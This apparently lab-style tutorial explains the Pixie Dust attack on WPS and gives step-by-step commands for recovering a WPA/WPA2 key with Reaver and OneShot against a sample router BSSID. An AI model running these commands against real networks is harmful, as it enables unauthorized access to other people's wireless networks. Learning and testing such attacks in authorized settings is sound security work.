
The Pixie Dust Attack is a well-known method for exploiting vulnerabilities in the WPS (Wi-Fi Protected Setup) protocol, used to retrieve the WPA/WPA2 pre-shared key (PSK) from a target wireless network. The attack takes advantage of weaknesses in the WPS implementation, specifically the way some routers handle the WPS PIN verification process. There are numerous tools available for performing Pixie Dust attacks, but we will focus on two major ones: Reaver and Oneshot.

---

### Using Reaver

To perform a Pixie Dust attack with `Reaver`, we require a network interface running in monitor mode. We can create a new interface `mon0` and enable monitor mode using the following commands.

```
iw dev wlan0 interface add mon0 type monitor
```

```
ifconfig mon0 up
```

```
airodump-ng mon0 --wps
```

```
reaver -K 1 -vvv -b 86:FC:9F:5D:67:4E -c 1 -i mon0
```

```
reaver -b 86:FC:9F:5D:67:4E -c 1 -p 32552273 -i mon0
```

### Using Oneshot

To perform a Pixie Dust attack using [OneShot](https://github.com/fulvius31/OneShot/tree/master), we again require our interface to be in monitor mode. However, before proceeding, we should delete the previously configured `mon0` interface.

```
iw dev mon0 del
```

```
airmon-ng start wlan0
```

Similar to Reaver, OneShot also includes the `-K` (or `--pixie-dust`) argument. Let's apply this option and initiate the attack.

```
python3 /opt/OneShot/oneshot.py -b 86:FC:9F:5D:67:4E -i wlan0mon -K
```

